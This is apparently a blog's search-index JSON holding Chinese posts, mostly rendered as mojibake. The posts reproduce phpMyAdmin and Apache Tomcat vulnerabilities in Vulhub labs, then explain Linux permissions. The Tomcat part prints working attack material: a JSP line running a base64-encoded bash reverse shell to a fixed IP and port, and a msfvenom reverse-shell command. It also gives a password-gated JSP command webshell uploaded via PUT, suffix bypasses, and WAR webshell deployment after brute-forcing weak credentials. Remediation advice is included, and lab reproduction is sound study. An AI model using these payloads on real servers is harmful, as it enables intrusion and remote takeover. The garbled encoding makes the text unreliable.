æ³•è¯»å–access.logçš„ï¼Œæ‰€ä»¥getshellå°±æ¯”è¾ƒå›°éš¾ã€‚åœ¨windowsä¸‹ï¼Œç”±äºå‡ ä¹æ‰€æœ‰çš„æµè§ˆå™¨å’Œpythonæ¨¡å—éƒ½ä¼šå¾ˆâ€œè‡ªè§‰åœ°â€å°†ç‰¹æ®Šå­—ç¬¦ç¼–ç è¿›è¡Œè½¬æ¢â€ï¼Œgetshellå°±æ›´å›°éš¾äº†ï¼Œæ‰€ä»¥åªèƒ½ç”¨socketå»æ„é€ shellã€‚ Access logä¸­å°±å‡ºç°äº†shelläº†ã€‚ å†ç”¨ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´å»åŒ…å«ï¼Œå°±å¯ä»¥æ‹¿åˆ°shelläº†ã€‚ åˆ©ç”¨æ–¹å¼äºŒ expä¿®æ”¹ä¸ºå¦‚ä¸‹ï¼š 1234567&lt;?phpclass PMA_Config&#123; public $source = &#x27;ftp://admin:admin@127.0.0.1/phpinfo.txt&#x27;;&#125;$a = new PMA_Config();echo serialize($a); é€šè¿‡FTPç›´æ¥è¿œç¨‹åˆ©ç”¨è·å–shell å‰ææ˜¯çœ‹allow_url_fopenï¼ˆé»˜è®¤æ˜¯å¼€å¯çš„ï¼‰ å‚è€ƒï¼š https://larry.ngrep.me/2016/09/21/cve-2016-5734-analysis/ https://rj45mp.github.io/phpMyAdmin-WooYun-2016-199433/ http://www.polaris-lab.com/index.php/archives/66/","categories":[],"tags":[{"name":"Vulhub","slug":"Vulhub","permalink":"http://www.m00nback.xyz/tags/Vulhub/"},{"name":"phpmyadmin","slug":"phpmyadmin","permalink":"http://www.m00nback.xyz/tags/phpmyadmin/"},{"name":"å¤ç°","slug":"å¤ç°","permalink":"http://www.m00nback.xyz/tags/%E5%A4%8D%E7%8E%B0/"}]},{"title":"Vulhubä¹‹tomcat","slug":"Vulhubä¹‹tomcat","date":"2020-03-06T14:13:50.000Z","updated":"2020-03-28T03:48:41.783Z","comments":true,"path":"2020/03/06/Vulhubä¹‹tomcat/","link":"","permalink":"http://www.m00nback.xyz/2020/03/06/Vulhub%E4%B9%8Btomcat/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†Vulhubä¸Štomcatçš„æ¼æ´å¤ç°ï¼Œæœ‰ä¸ªè¿˜çƒ­ä¹çš„ğŸ¤­ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†Vulhubä¸Štomcatçš„æ¼æ´å¤ç°ï¼Œæœ‰ä¸ªè¿˜çƒ­ä¹çš„ğŸ¤­ï¼ CVE-2020-1938æ¼æ´ç®€ä»‹2020å¹´2æœˆ20æ—¥ï¼Œå›½å®¶ä¿¡æ¯å®‰å…¨æ¼æ´å…±äº«å¹³å°ï¼ˆCNVDï¼‰å‘å¸ƒäº†Apache Tomcatæ–‡ä»¶åŒ…å«æ¼æ´ï¼ˆCNVD-2020-10487/CVE-2020-1938ï¼‰ã€‚è¯¥æ¼æ´æ˜¯ç”±äºTomcat AJPåè®®å­˜åœ¨ç¼ºé™·è€Œå¯¼è‡´ï¼Œæ”»å‡»è€…åˆ©ç”¨è¯¥æ¼æ´å¯é€šè¿‡æ„é€ ç‰¹å®šå‚æ•°ï¼Œè¯»å–æœåŠ¡å™¨webappä¸‹çš„ä»»æ„æ–‡ä»¶ã€‚ å½±å“èŒƒå›´å—å½±å“ç‰ˆæœ¬ Apache Tomcat 6 Apache Tomcat 7 &lt; 7.0.100 Apache Tomcat 8 &lt; 8.5.51 Apache Tomcat 9 &lt; 9.0.31 æ¼æ´å¤ç°å…ˆæŠŠç¯å¢ƒæ­å¥½ æ¼æ´EXPåœ°å€(Python)ï¼šhttps://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/[](https://github.com/YDHCUI/CNVD-2020-10487-Tomcat-Ajp-lfi/) tomcatçš„ç½‘ç«™ä»£ç é»˜è®¤ç›®å½•æ”¾åœ¨webapps/ROOT AJpçš„é»˜è®¤ç«¯å£æ˜¯8009ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨nmapæ¢æµ‹ä»¥ä¸‹æœåŠ¡ æˆ‘ä»¬è¯•ç€è¯»å–WEB-INF/web.xmlæ–‡ä»¶ æ—¢ç„¶æ˜¯æ–‡ä»¶åŒ…å«ï¼Œèƒ½æ§åˆ¶æ–‡ä»¶å†…å®¹çš„è¯å°±å¯ä»¥rceå•Š rce exp:https://github.com/00theway/Ghostcat-CNVD-2020-10487 æˆ‘ä»¬å…ˆæ§åˆ¶æ–‡ä»¶å†…å®¹ä¸º 1&lt;% Runtime.getRuntime().exec(&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny45Ny4yMTAuMTQxLzc3NzcgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);%&gt; ä¸ºå•¥ä¸èƒ½ç›´æ¥ç”¨ä¸‹é¢çš„è¿™æˆ‘ä¹Ÿä¸æ¸…æ¥š 1&lt;% Runtime.getRuntime().exec(&quot;bash -i &gt;&amp; /dev/tcp/47.97.210.141/7777 0&gt;&amp;1&quot;);%&gt; å¯ä»¥ç”¨è¿™ä¸ªåœ¨çº¿ç½‘ç«™ç”Ÿæˆbase64é‚£æ®µï¼šhttp://www.jackson-t.ca/runtime-exec-payloads.html ç„¶åå°±å¯ä»¥åŒ…å«äº† å½“ç„¶ä¹Ÿå¯ä»¥ç”¨msfç”Ÿæˆå’Œåé—¨ 1msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=4444 &gt; shell.txt ä¿®å¤æ„è§å…³é—­AJpç¼–è¾‘ &lt;CATALINA_BASE&gt;/conf/server.xmlï¼Œæ‰¾åˆ°å¦‚ä¸‹è¡Œï¼ˆ ä¸º Tomcat çš„å·¥ä½œç›®å½•ï¼‰ï¼š å°†æ­¤è¡Œæ³¨é‡Šæ‰ï¼ˆä¹Ÿå¯åˆ æ‰è¯¥è¡Œ) 1&lt;!--&lt;Connectorport=&quot;8009&quot; protocol=&quot;AJP/1.3&quot;redirectPort=&quot;8443&quot; /&gt;--&gt; ä¿å­˜åéœ€é‡æ–°å¯åŠ¨Tomcatï¼Œè§„åˆ™æ–¹å¯ç”Ÿæ•ˆã€‚ 123cd /usr/local/tomcat/bin./shutdown.sh./startup.sh ä¸å…³é—­AJpæœ€ç®€å•çš„å°±æ˜¯æ›´æ–°è‡³æœ€æ–°ç‰ˆæœ¬ å¦‚æœæ— æ³•æ›´æ–°æˆ‘ä»¬å¯ä»¥æŒ‰ç…§ä¸‹é¢çš„æ“ä½œ ä½¿ç”¨Tomcat 7å’ŒTomcat 9çš„ç”¨æˆ·å¯ä¸ºAJP Connectoré…ç½®secretæ¥è®¾ç½®AJPåè®®çš„è®¤è¯å‡­è¯ã€‚ä¾‹å¦‚ï¼Œå°†YOUR_TOMCAT_AJP_SECRETæ›´æ”¹ä¸ºä¸€ä¸ªå®‰å…¨æ€§é«˜ã€æ— æ³•è¢«è½»æ˜“çŒœè§£çš„å€¼ 1&lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot; secret=&quot;YOUR_TOMCAT_AJP_SECRET&quot;/&gt; ä½¿ç”¨Tomcat 8çš„ç”¨æˆ·å¯ä¸ºAJP Connectoré…ç½®requiredSecretæ¥è®¾ç½®AJPåè®®çš„è®¤è¯å‡­è¯ã€‚ä¾‹å¦‚ï¼Œå°†YOUR_TOMCAT_AJP_SECRETæ›´æ”¹ä¸ºä¸€ä¸ªå®‰å…¨æ€§é«˜ã€æ— æ³•è¢«è½»æ˜“çŒœè§£çš„å€¼ 1&lt;Connector port=&quot;8009&quot; protocol=&quot;AJP/1.3&quot; redirectPort=&quot;8443&quot; address=&quot;YOUR_TOMCAT_IP_ADDRESS&quot; requiredSecret=&quot;YOUR_TOMCAT_AJP_SECRET&quot; /&gt; æ›´æ”¹ä¹‹åé‡å¯ CVE-2017-12615æ¼æ´ç®€ä»‹å½“ Tomcat è¿è¡Œåœ¨ Windows æ“ä½œç³»ç»Ÿæ—¶ï¼Œä¸”å¯ç”¨äº† HTTP PUT è¯·æ±‚æ–¹æ³•ï¼ˆä¾‹å¦‚ï¼Œå°† readonly åˆå§‹åŒ–å‚æ•°ç”±é»˜è®¤å€¼è®¾ç½®ä¸º falseï¼‰ï¼Œæ”»å‡»è€…å°†æœ‰å¯èƒ½å¯é€šè¿‡ç²¾å¿ƒæ„é€ çš„æ”»å‡»è¯·æ±‚æ•°æ®åŒ…å‘æœåŠ¡å™¨ä¸Šä¼ åŒ…å«ä»»æ„ä»£ç çš„ JSP æ–‡ä»¶ï¼ŒJSPæ–‡ä»¶ä¸­çš„æ¶æ„ä»£ç å°†èƒ½è¢«æœåŠ¡å™¨æ‰§è¡Œã€‚å¯¼è‡´æœåŠ¡å™¨ä¸Šçš„æ•°æ®æ³„éœ²æˆ–è·å–æœåŠ¡å™¨æƒé™ã€‚ åœ¨config/web.xmlé‡Œï¼Œåœ¨å…¶ä¸­æ‰¾åˆ°default servletçš„é…ç½®é¡¹é‡Œå¢åŠ ä¸‹é¢ä¸€æ®µä»£ç ï¼Œå³å°†readonlyè®¾ç½®æˆfalseï¼Œä¾¿å¯ä»¥é€šè¿‡PUT/DELETEè¿›è¡Œæ–‡ä»¶æ“æ§ï¼Œè§¦å‘æ¼æ´ 1234&lt;init-param&gt; &lt;param-name&gt;readonly&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt; å½±å“èŒƒå›´å—å½±å“ç‰ˆæœ¬ï¼šApache Tomcat 7.0.0 - 7.0.79 (windowsç¯å¢ƒ) æ¼æ´å¤ç°æ‡’å¾—è£…ä¸ªtomcatäº†ï¼Œç›´æ¥ç”¨dockerå§ æˆ‘ä»¬ç›´æ¥å‘ä¸ªpostè¯·æ±‚ï¼ŒburpæŠ“åŒ…ï¼Œå°†POSTæ”¹æˆPUTï¼Œä¸Šä¼ ä¸€ä¸ªshell 123456789101112&lt;% if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123; java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream(); int a = -1; byte[] b = new byte[2048]; out.print(&quot;&lt;pre&gt;&quot;); while((a=in.read(b))!=-1)&#123; out.println(new String(b)); &#125; out.print(&quot;&lt;/pre&gt;&quot;); &#125;%&gt; å¯ä»¥çœ‹åˆ°å·²ç»ä¸Šä¼ æˆåŠŸ default servletåªèƒ½å¤„ç†é™æ€æ–‡ä»¶ï¼Œè€Œå¤„ç†jspæ–‡ä»¶æ˜¯jspservletï¼Œä½†æ˜¯åªæœ‰defaultservletæœ‰PUTä¸Šä¼ é€»è¾‘ï¼Œè§£å†³çš„åŠæ³•æ˜¯é€šè¿‡æ„é€ ç‰¹æ®Šçš„åç¼€åæ¥è¿›è¡Œç»•è¿‡ï¼Œä»è€Œä¸Šä¼ jspæœ¨é©¬ã€‚ Windowsï¼š shell.jsp%20 shell.jsp::$DATA shell.jsp/ shell.jsp/. Linuxï¼š shell.jsp/ shell.jsp/. å¦‚æœæƒ³çŸ¥é“æŸä¸ªç«™ç‚¹æ”¯æŒå“ªäº›è¯·æ±‚æ–¹å¼çš„è¯ï¼Œå¯ä»¥ç”¨nmap+script 1nmap 47.97.210.141 -p 8080 --script http-methods -sV ä¿®å¤æ„è§å°†readonlyçš„é…ç½®æ”¹ä¸ºtrue Tomcatåå°å¼±å£ä»¤getshellæ¼æ´ç®€ä»‹å…ˆä»‹ç»ä¸€ä¸‹tomcatçš„åå°ç®¡ç†ï¼Œç¯å¢ƒæ­å¥½åï¼Œè®¿é—®å‘ç° å‘ç°ä¸‰ä¸ªæŒ‰é’®ï¼šServer Status,Manager App,Host Manager åˆ†åˆ«è¡¨ç¤ºè¿›å…¥æœåŠ¡å™¨çŠ¶æ€ï¼Œç®¡ç†æœåŠ¡å™¨ä¸Šéƒ¨ç½²çš„åº”ç”¨ï¼Œç®¡ç†ä¸»æœºç•Œé¢ åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œtomcatçš„é…ç½®æ–‡ä»¶é‡Œæ²¡æœ‰è§’è‰²ï¼Œå› ä¸ºåœ¨tomcatçš„confæ–‡ä»¶å¤¹ä¸‹çš„tomcat-users.xmlæ–‡ä»¶ä¸­ï¼Œç”¨æˆ·æ˜¯è¢«æ³¨é‡Šæ‰çš„ã€‚ 1234567&lt;!-- &lt;role rolename=&quot;tomcat&quot;/&gt; &lt;role rolename=&quot;role1&quot;/&gt; &lt;user username=&quot;tomcat&quot; password=&quot;tomcat&quot; roles=&quot;tomcat&quot;/&gt; &lt;user username=&quot;both&quot; password=&quot;tomcat&quot; roles=&quot;tomcat,role1&quot;/&gt; &lt;user username=&quot;role1&quot; password=&quot;tomcat&quot; roles=&quot;role1&quot;/&gt;--&gt; æ‰€ä»¥ç‚¹å‡»ä¸‰ä¸ªä¸­ä»»æ„ä¸€ä¸ªæŒ‰é’®ï¼Œä¼šè·³è½¬åˆ°ä¸€ä¸ªæ‹’ç»çš„ç•Œé¢ åœ¨tomcat-users.xmlåŠ å…¥ä¸‹é¢çš„roleï¼Œå†åˆ›å»ºä¸€ä¸ªuserï¼Œé‡å¯æœåŠ¡å™¨è¾“å…¥ä¸‹é¢åˆ›å»ºçš„ç”¨æˆ·åå’Œå¯†ç å°±å¯ä»¥è¿›å…¥ç®¡ç†é¡µé¢äº† 123&lt;role rolename=&quot;manager-gui&quot;/&gt; //å¯¹åº”ç¬¬äºŒä¸ªæŒ‰é’®æƒé™&lt;role rolename=&quot;admin-gui&quot;/&gt; //å¯¹åº”ç¬¬ä¸‰ä¸ªæŒ‰é’®æƒé™&lt;user username=&quot;admin&quot; password=&quot;admin&quot; roles=&quot;manager-gui,admin-gui&quot;/&gt; å¦‚æœè®¾ç½®çš„è´¦å·å¯†ç æ˜¯å¼±å£ä»¤çš„è¯ï¼Œå°±å¯ä»¥ç™»é™†åå°è¿›ä¸€æ­¥getshell æ¼æ´å¤ç°ç›´æ¥ç‚¹å‡»å…¶ä¸­ä¸€ä¸ªï¼Œå‘ç°è¦è¾“è´¦å·å¯†ç  æˆ‘ä»¬å°è¯•burpæŠ“åŒ…ï¼Œè¿›è¡Œçˆ†ç ´ï¼Œè¿™é‡Œçš„è´¦å·å¯†ç éƒ½æ˜¯tomcat è¿›å…¥Manager Appé¡µé¢ï¼Œå‘ç°å¯ä»¥ä¸Šä¼ æ–‡ä»¶(waråŒ…)ä»¥åŠç›®å½•æ˜¾ç¤º war åŒ…æ˜¯ä¸€ç§æ‰“åŒ…æ ¼å¼ï¼ŒJava webå·¥ç¨‹ï¼Œéƒ½æ˜¯æ‰“æˆwaråŒ…ï¼Œè¿›è¡Œå‘å¸ƒï¼Œæ‰“æˆwaråŒ…çš„å¥½å¤„æ˜¯ä¸ä¼šç¼ºå°‘ç›®å½•ï¼Œå¹¶ä¸”åªç®¡ç†å¥½ä¸€ä¸ªå‘å¸ƒæ–‡ä»¶å°±å¥½ï¼Œå¹¶ä¸”tomcatæœåŠ¡å™¨èƒ½å¤Ÿè‡ªåŠ¨è¯†åˆ«ï¼Œå°†waråŒ…æ”¾åœ¨tomcatå®¹å™¨çš„webappsä¸‹ï¼Œå¯åŠ¨æœåŠ¡ï¼Œå³å¯è¿è¡Œè¯¥é¡¹ç›®ï¼Œè¯¥waråŒ…ä¼šè‡ªåŠ¨è§£å‹å‡ºä¸€ä¸ªåŒåçš„æ–‡ä»¶å¤¹ã€‚ ç›´æ¥å¯ä»¥åœ¨cmdé‡Œç”Ÿæˆ(æœ‰javaç¯å¢ƒ) 1jar -cvf shell.war shell.jsp ä¸Šä¼ ä¸Šå»æˆ‘ä»¬å‘ç°å¤šäº†ä¸ªshellæ–‡ä»¶å¤¹ å¯ä»¥çœ‹åˆ°æˆ‘ä»¬å·²ç»æˆåŠŸä¸Šä¼ ä¸€ä¸ªwebshellä¸Šå» å‚è€ƒï¼š http://blog.nsfocus.net/cve-2020-1938/ https://paper.seebug.org/399/ https://www.jianshu.com/p/023f3a249a81 https://www.jianshu.com/p/f3e4b5896edb","categories":[],"tags":[{"name":"Vulhub","slug":"Vulhub","permalink":"http://www.m00nback.xyz/tags/Vulhub/"},{"name":"å¤ç°","slug":"å¤ç°","permalink":"http://www.m00nback.xyz/tags/%E5%A4%8D%E7%8E%B0/"}]},{"title":"linuxç›¸å…³å†…å®¹å­¦ä¹ ","slug":"linuxç”¨æˆ·åŠç›¸å…³å‘½ä»¤","date":"2020-03-04T14:35:00.000Z","updated":"2020-06-24T14:52:28.148Z","comments":true,"path":"2020/03/04/linuxç”¨æˆ·åŠç›¸å…³å‘½ä»¤/","link":"","permalink":"http://www.m00nback.xyz/2020/03/04/linux%E7%94%A8%E6%88%B7%E5%8F%8A%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4/","excerpt":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†å’Œlinuxç”¨æˆ·åŠæƒé™çš„ç›¸å…³å†…å®¹ï¼Œæƒé™çš„ä¸œè¥¿ç»å¸¸å¼„æ··ï¼Œè®°ä¸€ä¸‹ï¼","text":"æœ¬ç¯‡åšå®¢ä¸»è¦ä»‹ç»äº†å’Œlinuxç”¨æˆ·åŠæƒé™çš„ç›¸å…³å†…å®¹ï¼Œæƒé™çš„ä¸œè¥¿ç»å¸¸å¼„æ··ï¼Œè®°ä¸€ä¸‹ï¼ Linuxæƒé™æˆ‘ä»¬å¯ä»¥ç”¨ls -læŸ¥çœ‹è¯¦ç»†ä¿¡æ¯ linuxä¸‹çš„æƒé™å¯åˆ†ä¸ºä¸‰ç§ï¼š rè¡¨ç¤ºè¯»ï¼Œæ•°å­—è¡¨ç¤ºä¸º4ã€‚å¯¹æ–‡ä»¶æ¥è¯´è¡¨ç¤ºå¯ä»¥è¯»å–æ­¤æ–‡ä»¶çš„å®é™…å†…å®¹ï¼Œè€Œå¯¹ç›®å½•æ¥è¯´è¡¨ç¤ºå¯ä»¥è¯»å–ç›®å½•ç»“æ„åˆ—è¡¨ï¼Œå³å¯ä»¥æŸ¥çœ‹ç›®å½•ä¸‹çš„æ–‡ä»¶åå’Œå­ç›®å½•åï¼Œæ³¨æ„ä»…ä»…æ˜¯åå­— wè¡¨ç¤ºå†™ï¼Œæ•°å­—è¡¨ç¤º2ã€‚å¯¹æ–‡ä»¶æ¥è¯´å¯ä»¥ç¼–è¾‘ã€æ·»åŠ æˆ–è€…æ˜¯ä¿®æ”¹è¯¥æ–‡ä»¶çš„å†…å®¹ï¼Œä½†ä¸åŒ…å«åˆ é™¤è¯¥æ–‡ä»¶ï¼Œè€Œå¯¹ç›®å½•æ¥è¯´è¡¨ç¤ºå…·æœ‰æ›´æ”¹è¯¥ç›®å½•ç»“æ„åˆ—è¡¨çš„æƒé™ï¼ŒåŒ…æ‹¬æ–°å»ºåˆ é™¤é‡å‘½åç§»åŠ¨æ–‡ä»¶æˆ–è€…æ–‡ä»¶å¤¹ xè¡¨ç¤ºæ‰§è¡Œï¼Œæ•°å­—è¡¨ç¤º1ã€‚å¯¹æ–‡ä»¶æ¥è¯´è¡¨ç¤ºè¯¥æ–‡ä»¶å…·æœ‰å¯ä»¥è¢«ç³»ç»Ÿæ‰§è¡Œçš„æƒé™ï¼Œè€Œå¯¹ç›®å½•æ¥è¯´è¡¨ç¤ºç”¨æˆ·å¯ä»¥è¿›å…¥è¯¥ç›®å½•æˆä¸ºå·¥ä½œç›®å½•ï¼Œå¦‚æœç”¨æˆ·å¯¹äºæŸä¸ªç›®å½•ä¸å…·æœ‰xæƒé™ï¼Œåˆ™æ— æ³•åˆ‡æ¢åˆ°è¯¥ç›®å½•ä¸‹ï¼Œä¹Ÿå°±æ— æ³•æ‰§è¡Œè¯¥ç›®å½•ä¸‹çš„ä»»ä½•å‘½ä»¤ï¼Œå³ä½¿å…·æœ‰è¯¥ç›®å½•çš„ræƒé™ã€‚ ä»¥å›¾conf.dä¸ºä¾‹ï¼š dä»£è¡¨æ˜¯ç›®å½•ï¼Œ-ä»£è¡¨æ–‡ä»¶ rwxä»£è¡¨æ–‡ä»¶æˆ–ç›®å½•æ‰€æœ‰è€…çš„æ‹¥æœ‰çš„æƒé™ r-xä»£è¡¨æ–‡ä»¶æˆ–ç›®å½•ç»„ç¾¤çš„æ‹¥æœ‰çš„æƒé™ r-xä»£è¡¨æ–‡ä»¶æˆ–ç›®å½•å…¶å®ƒäººçš„æ‹¥æœ‰çš„æƒé™ æ•°å­—2ä»£è¡¨ é“¾æ¥å ç”¨çš„èŠ‚ç‚¹ä¸ªæ•°ï¼Œå¦‚æœæ˜¯ç›®å½•åˆ™è¡¨ç¤ºè¯¥ç›®å½•æ‰€å«å­ç›®å½•æˆ–æ–‡ä»¶çš„ä¸ªæ•° ç¬¬ä¸€ä¸ªrootè¡¨ç¤ºæ–‡ä»¶æˆ–ç›®å½•æ‰€æœ‰è€… ç¬¬äºŒä¸ªrootä»£è¡¨æ–‡ä»¶æˆ–ç›®å½•æ‰€å±ç»„ 4096ä»£è¡¨çš„æ˜¯æ–‡ä»¶æˆ–æ–‡ä»¶å¤¹çš„å¤§å°ï¼Œå•ä½å­—èŠ‚ ç„¶åå°±æ˜¯æ—¶é—´äº†ï¼Œè¿™é‡Œæ˜¾ç¤ºçš„æ˜¯æœ€åä¿®æ”¹æ—¶é—´ è½¯è¿æ¥å’Œç¡¬è¿æ¥linuxç³»ç»Ÿä¸­æœ‰ç§æ–‡ä»¶æ˜¯é“¾æ¥æ–‡ä»¶ï¼Œå¯ä»¥ä¸ºè§£å†³æ–‡ä»¶çš„å…±äº«ä½¿ç”¨ã€‚é“¾æ¥çš„æ–¹å¼å¯ä»¥åˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯ç¡¬é“¾æ¥ï¼ˆHard Linkï¼‰ï¼Œå¦ä¸€ç§æ˜¯è½¯é“¾æ¥æˆ–è€…ä¹Ÿç§°ä¸ºç¬¦å·é“¾æ¥ï¼ˆSymbolic Linkï¼‰ã€‚ ç¡¬è¿æ¥ç¡¬é“¾æ¥æ˜¯æŒ‡é€šè¿‡ç´¢å¼•èŠ‚ç‚¹æ¥è¿›è¡Œé“¾æ¥ã€‚åœ¨Linuxçš„æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œä¿å­˜åœ¨ç£ç›˜åˆ†åŒºä¸­çš„æ–‡ä»¶ä¸ç®¡æ˜¯ä»€ä¹ˆç±»å‹éƒ½ä¼šç»™å®ƒåˆ†é…ä¸€ä¸ªç¼–å·ï¼Œè¿™ä¸ªç¼–å·è¢«ç§°ä¸ºç´¢å¼•èŠ‚ç‚¹ç¼–å·å·(Inode Index)æˆ–è€…Inodeï¼Œå®ƒæ˜¯æ–‡ä»¶æˆ–è€…ç›®å½•åœ¨ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­çš„å”¯ä¸€æ ‡è¯†ï¼Œæ–‡ä»¶çš„å®é™…æ•°æ®æ”¾ç½®åœ¨æ•°æ®åŒºåŸŸï¼ˆdata blockï¼‰ï¼Œå®ƒå­˜å‚¨ç€æ–‡ä»¶é‡è¦å‚æ•°ä¿¡æ¯ï¼Œä¹Ÿå°±æ˜¯å…ƒæ•°æ® ï¼ˆmetadataï¼‰ï¼Œæ¯”å¦‚åˆ›å»ºæ—¶é—´ã€ä¿®æ”¹æ—¶é—´ã€æ–‡ä»¶å¤§å°ã€å±ä¸»ã€å½’å±çš„ç”¨æˆ·ç»„ã€è¯»å†™æƒé™ã€æ•°æ®æ‰€åœ¨blockå·ç­‰ï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ åœ¨Linuxç³»ç»Ÿä¸­ï¼Œå¤šä¸ªæ–‡ä»¶åæŒ‡å‘åŒä¸€ç´¢å¼•èŠ‚ç‚¹(Inode)æ˜¯æ­£å¸¸ä¸”å…è®¸çš„ã€‚ä¸€èˆ¬è¿™ç§é“¾æ¥å°±ç§°ä¸ºç¡¬é“¾æ¥ã€‚ç¡¬é“¾æ¥çš„ä½œç”¨ä¹‹ä¸€æ˜¯å…è®¸ä¸€ä¸ªæ–‡ä»¶æ‹¥æœ‰å¤šä¸ªæœ‰æ•ˆè·¯å¾„åï¼Œè¿™æ ·ç”¨æˆ·å°±å¯ä»¥å»ºç«‹ç¡¬é“¾æ¥åˆ°é‡è¦çš„æ–‡ä»¶ï¼Œä»¥é˜²æ­¢â€œè¯¯åˆ â€æºæ•°æ®ï¼Œä¸è¿‡ç¡¬é“¾æ¥åªèƒ½åœ¨åŒä¸€æ–‡ä»¶ç³»ç»Ÿä¸­çš„æ–‡ä»¶ä¹‹é—´è¿›è¡Œé“¾æ¥ï¼Œä¸èƒ½å¯¹ç›®å½•è¿›è¡Œåˆ›å»ºã€‚ä¹‹æ‰€ä»¥æ–‡ä»¶å»ºç«‹äº†ç¡¬é“¾æ¥å°±ä¼šé˜²æ­¢æ•°æ®è¯¯åˆ ï¼Œæ˜¯å› ä¸ºæ–‡ä»¶ç³»ç»Ÿçš„åŸç†æ˜¯ï¼Œåªè¦æ–‡ä»¶çš„ç´¢å¼•èŠ‚ç‚¹è¿˜æœ‰ä¸€ä¸ªä»¥ä¸Šçš„é“¾æ¥ï¼ˆä»…åˆ é™¤äº†è¯¥æ–‡ä»¶çš„æŒ‡å‘ï¼‰ï¼Œåªåˆ é™¤å…¶ä¸­ä¸€ä¸ªé“¾æ¥å¹¶ä¸å½±å“ç´¢å¼•èŠ‚ç‚¹æœ¬èº«å’Œå…¶ä»–çš„é“¾æ¥ï¼ˆæ•°æ®çš„å®ä½“å¹¶æœªåˆ é™¤ï¼‰ï¼Œåªæœ‰å½“æœ€åä¸€ä¸ªé“¾æ¥è¢«åˆ é™¤åï¼Œæ­¤æ—¶å¦‚æœæœ‰æ–°æ•°æ®è¦å­˜å‚¨åˆ°ç£ç›˜ä¸Šï¼Œè¢«åˆ é™¤çš„æ–‡ä»¶çš„æ•°æ®å—åŠç›®å½•çš„é“¾æ¥æ‰ä¼šè¢«é‡Šæ”¾ï¼Œç©ºé—´è¢«æ–°æ•°æ®æš‚ç”¨è¦†ç›–ã€‚ è½¯è¿æ¥ è½¯é“¾æ¥ï¼ˆä¹Ÿå«ç¬¦å·é“¾æ¥ï¼‰ï¼Œç±»ä¼¼äºwindowsç³»ç»Ÿä¸­çš„å¿«æ·æ–¹å¼ï¼Œä¸ç¡¬é“¾æ¥ä¸åŒï¼Œè½¯é“¾æ¥å°±æ˜¯ä¸€ä¸ªæ™®é€šæ–‡ä»¶ï¼Œåªæ˜¯æ•°æ®å—å†…å®¹æœ‰ç‚¹ç‰¹æ®Šï¼Œæ–‡ä»¶ç”¨æˆ·æ•°æ®å—ä¸­å­˜æ”¾çš„å†…å®¹æ˜¯å¦ä¸€æ–‡ä»¶çš„è·¯å¾„åçš„æŒ‡å‘ï¼Œé€šè¿‡è¿™ä¸ªæ–¹å¼å¯ä»¥å¿«é€Ÿå®šä½åˆ°è½¯è¿æ¥æ‰€æŒ‡å‘çš„æºæ–‡ä»¶å®ä½“ã€‚è½¯é“¾æ¥å¯å¯¹æ–‡ä»¶æˆ–ç›®å½•åˆ›å»ºã€‚ lnå‘½ä»¤nå‘½ä»¤æ ¼å¼ï¼š ln [å‚æ•°] [æºæ–‡ä»¶æˆ–ç›®å½•] [ç›®æ ‡æ–‡ä»¶æˆ–ç›®å½•] ä¸»è¦å‚æ•°ï¼š -i äº¤äº’æ¨¡å¼ï¼Œæ–‡ä»¶å­˜åœ¨åˆ™æç¤ºç”¨æˆ·æ˜¯å¦è¦†ç›–ã€‚ -s è½¯é“¾æ¥(ç¬¦å·é“¾æ¥)ã€‚ -d å…è®¸è¶…çº§ç”¨æˆ·åˆ¶ä½œç›®å½•çš„ç¡¬é“¾æ¥ã€‚ -b åˆ é™¤ï¼Œè¦†ç›–ä»¥å‰å»ºç«‹çš„é“¾æ¥ è½¯é“¾æ¥ ï¼ˆç¬¦å·é“¾æ¥ï¼‰ ln -s source target ç¡¬é“¾æ¥ ï¼ˆå®ä½“é“¾æ¥ï¼‰ln source target ä¸‰ç§æ—¶é—´å¯¹äºæ–‡ä»¶æ¥è¯´ï¼Œä¸‰ç§æ—¶é—´æœ‰ä¸åŒçš„å«ä¹‰ï¼š è®¿é—®æ—¶é—´ï¼ˆatimeï¼šaccess timeï¼‰ï¼šè¯»ä¸€æ¬¡æ–‡ä»¶çš„å†…å®¹ï¼Œatimeå°±ä¼šæ›´æ–°ã€‚æ¯”å¦‚å¯¹è¿™ä¸ªæ–‡ä»¶è¿ç”¨ moreã€catç­‰å‘½ä»¤ã€‚å¦å¤–lsã€statå‘½ä»¤éƒ½ä¸ä¼šä¿®æ”¹æ–‡ä»¶çš„è®¿é—®æ—¶é—´ã€‚ ä¿®æ”¹æ—¶é—´ï¼ˆmtimeï¼šmodifiy timeï¼‰ï¼šmtimeæ˜¯æ–‡ä»¶å†…å®¹æœ€åä¸€æ¬¡è¢«ä¿®æ”¹æ—¶é—´ã€‚ä¾‹å¦‚viåä¿å­˜æ–‡ä»¶ã€‚ls -låˆ—å‡ºçš„æ—¶é—´å°±æ˜¯è¿™ä¸ªæ—¶é—´ã€‚ çŠ¶æ€æ”¹åŠ¨æ—¶é—´ï¼ˆctimeï¼šchange 